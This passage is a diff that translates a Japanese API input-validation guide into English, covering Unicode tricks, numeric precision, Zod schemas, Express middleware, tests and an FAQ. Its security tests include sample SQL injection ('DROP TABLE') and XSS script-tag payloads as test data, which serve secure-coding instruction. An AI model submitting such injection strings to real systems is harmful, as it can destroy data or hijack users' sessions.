     const valid = user && await bcrypt.compare(req.body.password, user.password);
 
     if (!valid) {
-      // メールとパスワードのどちらが間違っているかを明かさない
+      // Do not reveal whether it was the email or password that was wrong
       return res.status(401).json({
         type: 'https://api.example.com/errors/authentication',
         title: 'Authentication Failed',
@@ -1839,7 +1841,7 @@ app.post('/api/login', async (req, res) => {
       });
     }
   } catch (err) {
-    // 内部エラーの詳細はログに記録し、クライアントには汎用メッセージを返す
+    // Log internal error details, return a generic message to the client
     logger.error('Login error', { error: err, email: req.body.email });
     return res.status(500).json({
       type: 'https://api.example.com/errors/internal',
@@ -1853,31 +1855,31 @@ app.post('/api/login', async (req, res) => {
 
 ---
 
-## 11. エッジケース分析
+## 11. Edge Case Analysis
 
-### 11.1 エッジケース1: Unicode の正規化と見た目が同じ文字
+### 11.1 Edge Case 1: Unicode Normalization and Visually Identical Characters
 
 ```typescript
-// Unicode には「見た目は同じだが異なるコードポイント」の文字が多数存在する
+// Unicode contains many characters that "look the same but have different code points"
 
-// 例1: 全角/半角の混在
+// Example 1: Mixed full-width and half-width
 const inputs = [
-  'admin',          // 半角ラテン文字
-  'ａｄｍｉｎ',      // 全角ラテン文字 (U+FF41 等)
-  'аdmin',          // キリル文字の 'а' (U+0430) + ラテン文字 'dmin'
+  'admin',          // Half-width Latin characters
+  'ａｄｍｉｎ',      // Full-width Latin characters (U+FF41, etc.)
+  'аdmin',          // Cyrillic 'а' (U+0430) + Latin 'dmin'
 ];
 
-// これらは見た目がほぼ同じだが、バイト列は異なる
-// -> ユーザー名の一意性チェックをバイパスされる可能性がある
+// These look almost identical but have different byte sequences
+// -> Possibility of bypassing username uniqueness checks
 
-// 対策: Unicode 正規化 + ASCII 変換
+// Countermeasure: Unicode normalization + ASCII conversion
 function normalizeUsername(input: string): string {
-  // 1. NFKC 正規化（互換等価性による正規化）
-  //    全角英数字を半角に変換する
+  // 1. NFKC normalization (normalization by compatibility equivalence)
+  //    Converts full-width alphanumeric to half-width
   let normalized = input.normalize('NFKC');
 
-  // 2. 許可する文字範囲の限定
-  //    ASCII 英数字と一部記号のみ許可
+  // 2. Limit the range of allowed characters
+  //    Allow only ASCII alphanumeric and some symbols
   if (!/^[a-zA-Z0-9_-]+$/.test(normalized)) {
     throw new Error('Username contains invalid characters');
   }
@@ -1885,18 +1887,18 @@ function normalizeUsername(input: string): string {
   return normalized.toLowerCase();
 }
 
-// 例2: 結合文字と合成済み文字
-// 'e' + '◌́' (結合アキュートアクセント) = 'é' (NFD: 2コードポイント)
-// 'é' (U+00E9) (NFC: 1コードポイント)
-// これらは見た目が完全に同じだが、文字列比較で一致しない場合がある
+// Example 2: Combining characters and precomposed characters
+// 'e' + '◌́' (combining acute accent) = 'é' (NFD: 2 code points)
+// 'é' (U+00E9) (NFC: 1 code point)
+// These look completely identical but may not match in string comparison
 
-// 対策: 保存前に NFC 正規化を統一適用
+// Countermeasure: Apply NFC normalization consistently before saving
 const NameSchema = z.string()
   .min(1)
   .max(100)
   .transform(val => val.normalize('NFC').trim());
 
-// 例3: 不可視文字・ゼロ幅文字
+// Example 3: Invisible and zero-width characters
 // U+200B Zero Width Space
 // U+200C Zero Width Non-Joiner
 // U+200D Zero Width Joiner
@@ -1906,7 +1908,7 @@ function removeInvisibleChars(str: string): string {
   return str.replace(/[\u200B\u200C\u200D\uFEFF\u00AD\u2060\u180E]/g, '');
 }
 
-// Zod での包括的なユーザー名バリデーション
+// Comprehensive username validation with Zod
 const UsernameSchema = z.string()
   .transform(val => val.normalize('NFKC'))
   .transform(removeInvisibleChars)
@@ -1919,28 +1921,28 @@ const UsernameSchema = z.string()
   );
 ```
 
-### 11.2 エッジケース2: 数値の精度とオーバーフロー
+### 11.2 Edge Case 2: Numeric Precision and Overflow
 
 ```typescript
-// JavaScript/TypeScript の数値処理における罠
+// Pitfalls in JavaScript/TypeScript numeric processing
 
-// 問題1: IEEE 754 浮動小数点の精度限界
+// Problem 1: IEEE 754 floating-point precision limits
 console.log(0.1 + 0.2);           // 0.30000000000000004
 console.log(0.1 + 0.2 === 0.3);   // false
 
-// 問題2: 大きな整数の精度喪失
+// Problem 2: Precision loss with large integers
 console.log(9007199254740992 === 9007199254740993); // true (!)
 // Number.MAX_SAFE_INTEGER = 9007199254740991
 
-// 問題3: JSON パースでの精度喪失
+// Problem 3: Precision loss during JSON parsing
 const json = '{"id": 9007199254740993}';
-console.log(JSON.parse(json).id); // 9007199254740992 (1 ずれる)
+console.log(JSON.parse(json).id); // 9007199254740992 (off by 1)
 
-// --- 対策 ---
+// --- Countermeasures ---
 
-// ① 金額は整数（最小通貨単位）で扱う
+// 1. Handle monetary amounts as integers (smallest currency unit)
 const MoneySchema = z.object({
-  // 金額は「銭」単位（1円 = 100銭）で保持
+  // Amount stored in minor units (1 USD = 100 cents)
   amountInMinorUnit: z.number()
     .int('Amount must be an integer')
     .min(0, 'Amount must be non-negative')
@@ -1948,7 +1950,7 @@ const MoneySchema = z.object({
   currency: z.enum(['JPY', 'USD', 'EUR']),
 });
 
-// ② 大きなIDはstringで扱う
+// 2. Handle large IDs as strings
 const ResourceIdSchema = z.string()
   .regex(/^\d{1,20}$/, 'Invalid resource ID')
   .refine(
@@ -1959,15 +1961,15 @@ const ResourceIdSchema = z.string()
     'Resource ID must be positive'
   );
 
-// ③ Decimal 型の使用（prisma）
+// 3. Use Decimal type (Prisma)
 // schema.prisma:
 // model Product {
 //   price Decimal @db.Decimal(10, 2)
 // }
 
-// ④ JSON の大きな数値を文字列として受け取る
+// 4. Receive large JSON numbers as strings
 const TransactionSchema = z.object({
-  // Twitter/Snowflake ID 等の大きな整数
+  // Twitter/Snowflake IDs and other large integers
   transactionId: z.string()
     .regex(/^\d{1,20}$/)
     .describe('Transaction ID as string to prevent precision loss'),
@@ -1977,41 +1979,41 @@ const TransactionSchema = z.object({
     .describe('Amount as string for decimal precision'),
 });
 
-// ⑤ 整数範囲の明示的チェック
+// 5. Explicitly check integer range
 const SafeIntSchema = z.number()
   .int()
   .min(Number.MIN_SAFE_INTEGER)
   .max(Number.MAX_SAFE_INTEGER);
 ```
 
-### 11.3 エッジケース3: タイムゾーンと日時バリデーション
+### 11.3 Edge Case 3: Timezone and Datetime Validation
 
 ```typescript
-// 日時バリデーションの落とし穴
+// Pitfalls in datetime validation
 
-// 問題1: タイムゾーン情報の欠落
-// "2024-03-15T10:00:00" -> どのタイムゾーンの10時?
-// "2024-03-15T10:00:00Z" -> UTC の10時（明確）
-// "2024-03-15T10:00:00+09:00" -> JST の10時（明確）
+// Problem 1: Missing timezone information
+// "2024-03-15T10:00:00" -> 10 o'clock in which timezone?
+// "2024-03-15T10:00:00Z" -> 10 o'clock UTC (clear)
+// "2024-03-15T10:00:00+09:00" -> 10 o'clock JST (clear)
 
-// 対策: ISO 8601 形式でタイムゾーンを必須化
+// Countermeasure: Require timezone in ISO 8601 format
 const DateTimeSchema = z.string()
   .datetime({ message: 'Must be ISO 8601 format with timezone' });
 // "2024-03-15T10:00:00Z" -> OK
 // "2024-03-15T10:00:00+09:00" -> OK
 // "2024-03-15T10:00:00" -> NG
 
-// 問題2: うるう秒、夏時間の切り替え
-// 2024-03-10T02:30:00 America/New_York -> 存在しない（夏時間で2:00->3:00）
-// 2024-11-03T01:30:00 America/New_York -> 曖昧（01:30が2回発生）
+// Problem 2: Leap seconds, daylight saving time transitions
+// 2024-03-10T02:30:00 America/New_York -> Does not exist (DST jump: 2:00->3:00)
+// 2024-11-03T01:30:00 America/New_York -> Ambiguous (01:30 occurs twice)
 
-// 対策: UTC で保存し、表示時にタイムゾーン変換
+// Countermeasure: Store in UTC, convert timezone for display
 const EventSchema = z.object({
   title: z.string().min(1).max(200),
-  // 常に UTC で受け取り、保存する
+  // Always receive and store in UTC
   startAt: z.string().datetime(),
   endAt: z.string().datetime(),
-  // 表示用のタイムゾーン情報は別フィールド
+  // Timezone information for display is a separate field
   timezone: z.string()
     .regex(/^[A-Za-z]+\/[A-Za-z_]+$/, 'Invalid timezone format')
     .default('UTC'),
@@ -2023,25 +2025,25 @@ const EventSchema = z.object({
 
 ---
 
-## 12. 演習問題
+## 12. Exercises
 
-### 12.1 演習1（基礎）: ECサイトの商品登録スキーマ
+### 12.1 Exercise 1 (Basic): Product Registration Schema for an E-commerce Site
 
-以下の要件を満たす Zod スキーマ `CreateProductSchema` を作成せよ。
+Create a Zod schema `CreateProductSchema` that satisfies the following requirements.
 
-要件:
-- `name`: 必須、1-200文字、前後の空白を除去
-- `description`: 任意、最大5000文字、HTMLタグを無効化
-- `price`: 必須、0以上の整数、最大値 999,999,999
-- `currency`: 必須、'JPY', 'USD', 'EUR' のいずれか
-- `category`: 必須、'electronics', 'clothing', 'food', 'books', 'other' のいずれか
-- `tags`: 任意、文字列の配列、各タグ最大30文字、最大20個
-- `images`: 必須、1-10個のオブジェクト配列、各オブジェクトは `url`（URL形式）と `alt`（1-100文字）を持つ
-- `stock`: 必須、0以上の整数
-- `isPublished`: 任意、デフォルト false
+Requirements:
+- `name`: Required, 1–200 characters, remove leading/trailing whitespace
+- `description`: Optional, maximum 5000 characters, disable HTML tags
+- `price`: Required, non-negative integer, maximum 999,999,999
+- `currency`: Required, one of 'JPY', 'USD', 'EUR'
+- `category`: Required, one of 'electronics', 'clothing', 'food', 'books', 'other'
+- `tags`: Optional, array of strings, each tag maximum 30 characters, maximum 20 tags
+- `images`: Required, array of 1–10 objects, each object has `url` (URL format) and `alt` (1–100 characters)
+- `stock`: Required, non-negative integer
+- `isPublished`: Optional, default false
 
 ```typescript
-// 解答例:
+// Solution:
 const CreateProductSchema = z.object({
   name: z.string()
     .min(1, 'Product name is required')
@@ -2084,19 +2086,19 @@ const CreateProductSchema = z.object({
 type CreateProductInput = z.infer<typeof CreateProductSchema>;
 ```
 
-### 12.2 演習2（中級）: 汎用バリデーションミドルウェアの構築
+### 12.2 Exercise 2 (Intermediate): Building a Generic Validation Middleware
 
-Express 用の汎用バリデーションミドルウェアを構築せよ。以下の要件を満たすこと。
+Build a generic validation middleware for Express. It must satisfy the following requirements.
 
-要件:
-- body, query, params, headers のすべてをバリデーション可能
-- エラーは RFC 7807 形式で返す
-- 全エラーを収集して一括返却する
-- requestId をエラーレスポンスに含める
-- ログ出力を含める
+Requirements:
+- Able to validate body, query, params, and headers
+- Return errors in RFC 7807 format
+- Collect all errors and return them together
+- Include requestId in error response
+- Include log output
 
 ```typescript
-// 解答例:
+// Solution:
 import { z, ZodSchema } from 'zod';
 import { Request, Response, NextFunction } from 'express';
 import { randomUUID } from 'crypto';
@@ -2175,7 +2177,7 @@ function createValidator(schemas: ValidationSchemas) {
   };
 }
 
-// 使用例:
+// Usage example:
 app.post('/api/v1/products',
   createValidator({
     body: CreateProductSchema,
@@ -2190,23 +2192,23 @@ app.post('/api/v1/products',
 );
 ```
 
-### 12.3 演習3（上級）: バリデーション + サニタイゼーション + セキュリティの統合
+### 12.3 Exercise 3 (Advanced): Integration of Validation + Sanitization + Security
 
-ブログ投稿 API のエンドポイントを構築せよ。以下のセキュリティ要件をすべて満たすこと。
+Build an endpoint for a blog post API that satisfies all of the following security requirements.
 
-要件:
-- Mass Assignment 防止（`.strict()` 使用）
-- XSS 防止（HTML サニタイゼーション）
-- SQL インジェクション防止（パラメタライズドクエリ）
-- ReDoS 防止（安全な正規表現 + 入力長制限）
-- パストラバーサル防止（ファイル名検証）
-- ペイロードサイズ制限
-- 適切なエラーレスポンス
+Requirements:
+- Mass Assignment prevention (use `.strict()`)
+- XSS prevention (HTML sanitization)
+- SQL injection prevention (parameterized queries)
+- ReDoS prevention (safe regex + input length limit)
+- Path traversal prevention (filename validation)
+- Payload size limit
+- Appropriate error responses
 
 ```typescript
-// 解答例:
+// Solution:
 
-// ① スキーマ定義（Mass Assignment 防止）
+// 1. Schema definition (Mass Assignment prevention)
 const CreateBlogPostSchema = z.object({
   title: z.string()
     .min(1, 'Title is required')
@@ -2214,7 +2216,7 @@ const CreateBlogPostSchema = z.object({
     .trim()
     .transform(removeControlChars),
 
-  // HTML を許可するが、安全なタグのみ
+  // Allow HTML but only safe tags
   content: z.string()
     .min(1, 'Content is required')
     .max(100000, 'Content must be 100000 characters or less')
@@ -2242,18 +2244,18 @@ const CreateBlogPostSchema = z.object({
   }).optional(),
 
   status: z.enum(['draft', 'published']).default('draft'),
-}).strict(); // 未定義フィールドを拒否
+}).strict(); // Reject undefined fields
 
-// ② ルートハンドラ
+// 2. Route handler
 app.post('/api/v1/posts',
-  express.json({ limit: '2mb' }),   // ペイロードサイズ制限
-  authenticate,                      // 認証
+  express.json({ limit: '2mb' }),   // Payload size limit
+  authenticate,                      // Authentication
   createValidator({ body: CreateBlogPostSchema }),
   async (req, res) => {
     const { title, content, slug, tags, coverImage, status } = req.body;
     const authorId = req.user.id;
 
-    // ③ パラメタライズドクエリで保存
+    // 3. Save with parameterized queries
     const result = await pool.query(
       `INSERT INTO posts (title, content, slug, tags, cover_image, status, author_id, created_at)
        VALUES ($1, $2, $3, $4, $5, $6, $7, NOW())
@@ -2270,45 +2272,45 @@ app.post('/api/v1/posts',
 
 ---
 
-## 13. 環境変数のバリデーション
+## 13. Environment Variable Validation
 
-起動時に環境変数を検証することで、設定ミスによる本番障害を防止できる。
+Validating environment variables at startup prevents production incidents caused by misconfiguration.
 
 ```typescript
 // ============================================================
-// コード例7: 環境変数のバリデーション（起動時チェック）
+// Code Example 7: Environment Variable Validation (Startup Check)
 // ============================================================
 
 const EnvSchema = z.object({
-  // サーバー設定
+  // Server settings
   NODE_ENV: z.enum(['development', 'staging', 'production']),
   PORT: z.coerce.number().int().min(1).max(65535).default(3000),
   HOST: z.string().default('0.0.0.0'),
 
-  // データベース
+  // Database
   DATABASE_URL: z.string().url(),
   DATABASE_POOL_SIZE: z.coerce.number().int().min(1).max(100).default(10),
 
   // Redis
   REDIS_URL: z.string().url(),
 
-  // 認証
+  // Authentication
   JWT_SECRET: z.string().min(32, 'JWT_SECRET must be at least 32 characters'),
   JWT_EXPIRY: z.string().default('15m'),
 
-  // 外部サービス
+  // External services
   SMTP_HOST: z.string().min(1),
   SMTP_PORT: z.coerce.number().int().default(587),
   SMTP_USER: z.string().min(1),
   SMTP_PASS: z.string().min(1),
 
-  // ログ
+  // Logging
   LOG_LEVEL: z.enum(['debug', 'info', 'warn', 'error']).default('info'),
 });
 
 type Env = z.infer<typeof EnvSchema>;
 
-// 起動時にバリデーション実行
+// Run validation at startup
 function loadEnv(): Env {
   const result = EnvSchema.safeParse(process.env);
 
@@ -2317,31 +2319,31 @@ function loadEnv(): Env {
     result.error.issues.forEach(issue => {
       console.error(`  ${issue.path.join('.')}: ${issue.message}`);
     });
-    process.exit(1); // 環境変数が不正なら起動しない
+    process.exit(1); // Do not start if environment variables are invalid
   }
 
   return result.data;
 }
 
-// アプリケーション起動
+// Application startup
 const env = loadEnv();
 console.log(`Starting server on ${env.HOST}:${env.PORT} in ${env.NODE_ENV} mode`);
 ```
 
 ---
 
-## 14. テスト戦略
+## 14. Testing Strategy
 
-バリデーションロジックは単体テストとの相性が非常に良い。正常系・異常系・境界値をテストすることで、バリデーションの網羅性を確保できる。
+Validation logic works extremely well with unit testing. By testing normal cases, error cases, and boundary values, you can ensure comprehensive coverage of your validation.
 
 ```typescript
 // ============================================================
-// コード例8: バリデーションスキーマのテスト
+// Code Example 8: Testing Validation Schemas
 // ============================================================
 import { describe, it, expect } from 'vitest';
 
 describe('CreateUserSchema', () => {
-  // --- 正常系 ---
+  // --- Normal cases ---
   it('should accept valid input with all required fields', () => {
     const input = {
       name: 'Tanaka Taro',
@@ -2352,8 +2354,8 @@ describe('CreateUserSchema', () => {
     if (result.success) {
       expect(result.data.name).toBe('Tanaka Taro');
       expect(result.data.email).toBe('taro@example.com');
-      expect(result.data.role).toBe('user');  // デフォルト値
-      expect(result.data.tags).toEqual([]);   // デフォルト値
+      expect(result.data.role).toBe('user');  // Default value
+      expect(result.data.tags).toEqual([]);   // Default value
     }
   });
 
@@ -2375,7 +2377,7 @@ describe('CreateUserSchema', () => {
     }
   });
 
-  // --- 異常系 ---
+  // --- Error cases ---
   it('should reject empty name', () => {
     const input = { name: '', email: 'taro@example.com' };
     const result = CreateUserSchema.safeParse(input);
@@ -2403,7 +2405,7 @@ describe('CreateUserSchema', () => {
     expect(result.success).toBe(false);
   });
 
-  // --- 境界値テスト ---
+  // --- Boundary value tests ---
   it('should accept name with exactly 100 characters', () => {
     const input = { name: 'a'.repeat(100), email: 'taro@example.com' };
     const result = CreateUserSchema.safeParse(input);
@@ -2436,11 +2438,11 @@ describe('CreateUserSchema', () => {
     expect(result.success).toBe(false);
   });
 
-  // --- セキュリティテスト ---
+  // --- Security tests ---
   it('should handle SQL injection attempt in email', () => {
     const input = { name: 'Taro', email: "'; DROP TABLE users; --" };
     const result = CreateUserSchema.safeParse(input);
-    expect(result.success).toBe(false); // email 形式に合致しない
+    expect(result.success).toBe(false); // Does not match email format
   });
 
   it('should handle XSS attempt in name', () => {
@@ -2448,111 +2450,111 @@ describe('CreateUserSchema', () => {
       name: '<script>alert("xss")</script>',
       email: 'taro@example.com',
     };
-    // name フィールドにはHTMLエスケープの transform がないため、
-    // バリデーション自体は通る可能性があるが、出力時にエスケープされる
+    // The name field has no HTML escape transform, so validation itself
+    // may pass, but output-time escaping is what matters
     const result = CreateUserSchema.safeParse(input);
-    // 結果に関わらず、出力時のエスケープが重要
+    // Regardless of result, output-time escaping is critical
   });
 });
 ```
 
 ---
 
-## 15. パフォーマンスに関する考慮事項
+## 15. Performance Considerations
 
-### 15.1 バリデーションのパフォーマンス比較
+### 15.1 Validation Performance Comparison
 
-| ライブラリ | 1000回バリデーション（単純スキーマ） | 1000回バリデーション（複雑スキーマ） | 備考 |
-|-----------|----------------------------------|----------------------------------|------|
-| Zod | 約 2-5ms | 約 10-30ms | コンパイル済みスキーマは高速 |
-| Joi | 約 5-15ms | 約 30-80ms | 豊富な機能がオーバーヘッドに |
-| class-validator | 約 10-20ms | 約 40-100ms | リフレクション使用のため |
-| JSON Schema (ajv) | 約 0.5-2ms | 約 3-10ms | 事前コンパイルで最速 |
+| Library | 1000 validations (simple schema) | 1000 validations (complex schema) | Notes |
+|---------|----------------------------------|-----------------------------------|-------|
+| Zod | ~2–5ms | ~10–30ms | Compiled schemas are fast |
+| Joi | ~5–15ms | ~30–80ms | Rich features add overhead |
+| class-validator | ~10–20ms | ~40–100ms | Uses reflection |
+| JSON Schema (ajv) | ~0.5–2ms | ~3–10ms | Fastest with pre-compilation |
 
-※ 上記の数値は一般的な傾向を示すものであり、スキーマの構造やデータサイズによって大きく変動する。
+* The numbers above indicate general tendencies and vary significantly depending on schema structure and data size.
 
-### 15.2 パフォーマンス最適化のヒント
+### 15.2 Performance Optimization Tips
 
 ```typescript
-// ① スキーマのキャッシュ（毎回生成しない）
-// NG: リクエストごとにスキーマを生成
+// 1. Cache schemas (do not generate them every time)
+// BAD: Generate schema per request
 app.post('/api/users', (req, res) => {
-  const schema = z.object({ /* ... */ }); // 毎回生成（無駄）
+  const schema = z.object({ /* ... */ }); // Generated every time (wasteful)
   schema.parse(req.body);
 });
 
-// OK: モジュールレベルで一度だけ定義
-const UserSchema = z.object({ /* ... */ }); // 一度だけ生成
+// GOOD: Define once at module level
+const UserSchema = z.object({ /* ... */ }); // Generated only once
 app.post('/api/users', (req, res) => {
-  UserSchema.parse(req.body); // 再利用
+  UserSchema.parse(req.body); // Reused
 });
 
-// ② 不要な transform を避ける
-// バリデーション後の transform が重い場合、
-// バリデーションと変換を分離する
+// 2. Avoid unnecessary transforms
+// If post-validation transforms are heavy,
+// separate validation and transformation
 
-// ③ 巨大な配列の要素バリデーションを最適化
-// 1000要素の配列に対して複雑なバリデーションを適用する場合、
-// まず配列サイズを制限してからバリデーションを実行する
+// 3. Optimize element validation for large arrays
+// When applying complex validation to an array of 1000 elements,
+// first limit the array size and then run validation
 const LargeArraySchema = z.array(
   z.object({ /* ... */ })
-).max(100); // まずサイズを制限
+).max(100); // Limit size first
 ```
 
 ---
 
-## まとめ
+## Summary
 
-| 概念 | ポイント |
-|------|---------|
-| 信頼境界 | 外部入力は全て信頼しない。バリデーションは信頼境界で実施する |
-| Zod | TypeScript-first。z.infer による型推論が最大の強み。safeParse で安全に検証 |
-| Joi | 歴史が長く枯れたライブラリ。when による条件分岐が強力 |
-| class-validator | デコレータベース。NestJS のデフォルト。class-transformer と組み合わせて使用 |
-| サニタイゼーション | 入力時と出力時の両方で実施。コンテキストに応じたエスケープが重要 |
-| SQL インジェクション防御 | パラメタライズドクエリが絶対原則。文字列結合は厳禁 |
-| XSS 防御 | Content-Type 設定、CSP ヘッダー、出力時のHTMLエスケープ |
-| Mass Assignment 防御 | ホワイトリスト + strict() で許可フィールドのみ受け入れ |
-| ReDoS 防御 | 入力長制限 + 安全な正規表現パターン |
-| エラーレスポンス | RFC 7807 形式で全エラーをまとめて 422 で返す |
-| 環境変数 | 起動時にスキーマバリデーションを実行して不正な設定での起動を防止 |
-| テスト | 正常系・異常系・境界値・セキュリティの4観点でバリデーションをテスト |
+| Concept | Key Points |
+|---------|-----------|
+| Trust Boundary | Never trust external input. Perform validation at the trust boundary |
+| Zod | TypeScript-first. Automatic type inference via z.infer is its greatest strength. Use safeParse for safe validation |
+| Joi | Long-established, mature library. Powerful conditional branching via when |
+| class-validator | Decorator-based. NestJS default. Used in combination with class-transformer |
+| Sanitization | Apply at both input and output time. Context-appropriate escaping is critical |
+| SQL Injection Defense | Parameterized queries are the absolute rule. String concatenation is strictly forbidden |
+| XSS Defense | Set Content-Type, CSP headers, and HTML escape at output time |
+| Mass Assignment Defense | Accept only allowed fields with whitelist + strict() |
+| ReDoS Defense | Input length limit + safe regex patterns |
+| Error Responses | Return all errors together in RFC 7807 format with 422 |
+| Environment Variables | Run schema validation at startup to prevent starting with invalid configuration |
+| Testing | Test validation from 4 perspectives: normal cases, error cases, boundary values, and security |
 
 ---
 
 ## FAQ
 
-### Q1: バリデーションはどのレイヤーで行うべきか?
+### Q1: At which layer should validation be performed?
 
-バリデーションは「信頼境界を超える地点」で行うのが原則である。Web API の場合、コントローラー層（リクエストハンドラーの入口）で実施するのが一般的である。ビジネスルールの検証はサービス層で行い、DB の制約（UNIQUE、NOT NULL 等）はデータアクセス層の最終防衛線として機能する。多層的に検証することで、いずれかの層でバグがあっても他の層で防御できる。
+The principle is to perform validation "at the point where data crosses a trust boundary." For web APIs, it is common practice to perform validation at the controller layer (the entry point of the request handler). Business rule validation is performed in the service layer, and DB constraints (UNIQUE, NOT NULL, etc.) function as the last line of defense in the data access layer. Validating at multiple layers means that even if there is a bug in one layer, the other layers can provide defense.
 
-### Q2: parse と safeParse のどちらを使うべきか?
+### Q2: Which should I use, parse or safeParse?
 
-原則として `safeParse` を使用すべきである。`parse` はバリデーション失敗時に例外をスローするため、try-catch が必要になり、制御フローが複雑になる。一方、`safeParse` は Result 型（success/error）を返すため、TypeScript の型ガードと組み合わせて安全にエラーハンドリングできる。ただし、環境変数のバリデーション等「失敗時にプロセスを終了すべき場面」では `parse` を使っても問題ない。
+In principle, you should use `safeParse`. `parse` throws an exception when validation fails, requiring try-catch and making the control flow complex. On the other hand, `safeParse` returns a Result type (success/error), which can be safely handled with TypeScript type guards. However, there is no problem using `parse` in scenarios where the process should terminate on failure, such as environment variable validation.
 
-### Q3: バリデーションライブラリを途中で変更できるか?
+### Q3: Can I change the validation library mid-project?
 
-可能だが、コストは高い。バリデーションスキーマを「ミドルウェア」としてルーティングから分離し、バリデーション結果のインターフェースを統一しておけば、内部のライブラリ変更は比較的容易になる。本章の `validateInput` 関数のように、ライブラリ固有の API を薄いラッパーで覆い、アプリケーションコードがライブラリに直接依存しない設計が望ましい。
+It is possible, but the cost is high. By separating validation schemas as "middleware" from routing and standardizing the validation result interface, changing the internal library becomes relatively straightforward. As with the `validateInput` function in this guide, a design where application code wraps library-specific APIs in a thin wrapper and does not directly depend on the library is desirable.
 
-### Q4: JSON Schema とバリデーションライブラリの関係は?
+### Q4: What is the relationship between JSON Schema and validation libraries?
 
-JSON Schema は「スキーマ定義の標準仕様」であり、OpenAPI（Swagger）仕様の一部として API ドキュメントにも使用される。ajv のような JSON Schema バリデータは高速だが、TypeScript の型推論やカスタムバリデーションの柔軟性では Zod 等に劣る。両者を組み合わせる戦略として、「Zod でスキーマを定義し、zod-to-json-schema で JSON Schema を自動生成して OpenAPI ドキュメントに使用する」というアプローチがある。
+JSON Schema is a "standard specification for schema definition" and is also used as part of the OpenAPI (Swagger) specification for API documentation. JSON Schema validators like ajv are fast but inferior to Zod and others in TypeScript type inference and the flexibility of custom validation. A strategy combining both: "define schemas with Zod and use zod-to-json-schema to auto-generate JSON Schema for use in OpenAPI documentation."
 
-### Q5: GraphQL の場合もバリデーションライブラリは必要か?
+### Q5: Is a validation library still needed for GraphQL?
 
-GraphQL はスキーマ定義によって型レベルのバリデーションを自動的に行う。しかし、「文字列の最大長」「正規表現パターン」「ビジネスルール」といったフィールドレベルの詳細なバリデーションは GraphQL スキーマだけでは表現できない。そのため、リゾルバ内で Zod 等を使ったバリデーションを追加することが推奨される。
-
----
-
-## 次に読むべきガイド
-
-- APIテスト
-- [認証](./00-authentication-patterns.md)
-- [レート制限](./01-rate-limiting.md)
+GraphQL automatically performs type-level validation through schema definitions. However, detailed field-level validation such as "maximum string length," "regex patterns," and "business rules" cannot be expressed with GraphQL schemas alone. Therefore, it is recommended to add validation using Zod or similar libraries within resolvers.
 
 ---
 
-## 参考文献
+## Further Reading
+
+- API Testing
+- [Authentication](./00-authentication-patterns.md)
+- [Rate Limiting](./01-rate-limiting.md)
+
+---
+
+## References
 
 1. Zod. "TypeScript-first schema validation with static type inference." github.com/colinhacks/zod, 2024.
 2. OWASP. "Input Validation Cheat Sheet." cheatsheetseries.owasp.org, 2024.
@@ -2562,4 +2564,3 @@ GraphQL はスキーマ定義によって型レベルのバリデーションを
 6. class-validator. "Decorator-based property validation for classes." github.com/typestack/class-validator, 2024.
 7. RFC 7807. "Problem Details for HTTP APIs." tools.ietf.org/html/rfc7807, 2016.
 8. DOMPurify. "DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer." github.com/cure53/DOMPurify, 2024.
-
